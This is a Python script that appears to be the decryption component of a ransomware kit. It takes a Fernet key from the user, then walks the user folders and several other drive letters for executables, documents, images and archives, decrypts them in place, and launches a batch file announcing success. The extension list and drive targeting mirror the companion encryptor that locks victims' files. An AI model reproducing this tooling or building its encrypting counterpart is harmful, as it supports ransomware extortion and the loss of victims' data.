from cryptography.fernet import Fernet
import getpass
import os
from itertools import chain

insertkey = input(str("Insert key to decrypt > "))

with open("yourkey.key","a") as wrt:
    wrt.truncate(0)
    wrt.write(insertkey)
    wrt.close()

with open("yourkey.key","rb") as readit:
    key = readit.read()
  
fernet = Fernet(key)

encrypted_extension = (".exe",".txt",".jpg",".lnk",".ico",".pptx",".docx",".dll",".mp4",".mp3",".bin",".rtf",".odt",".png",".pdf",".zip",".rar")
#GRAB ALL FILES FROM (encrypted_extension)

all_file_paths = []
paths = ('C:\\Users','F:\\','G:\\','Y:\\','S:\\','M:\\','N:\\','X:\\')
for root,dirs,files in chain.from_iterable(os.walk(path) for path in paths):
    for file in files:
        file_path,file_ext = os.path.splitext(root+"\\"+file)
        if file_ext in encrypted_extension:
            all_file_paths.append(root+"\\"+file)
print("Decrypting files... Please be patient, this can take a while. Do not close this window!!")
for f in all_file_paths:
    try:
        with open(f, 'rb') as file:
            original = file.read()
            
        decrypted = fernet.decrypt(original)
        
        with open(f, 'wb') as encrypted_file:
            encrypted_file.write(decrypted)
    except:
        pass
with open("decrypted.bat","a") as successfull:
    successfull.truncate(0)
    successfull.write("""
color a
ECHO off
cls
echo Files Succesfully Decrypted.
echo Now you can close this window.
@pause
""")
os.system(f"start decrypted.bat")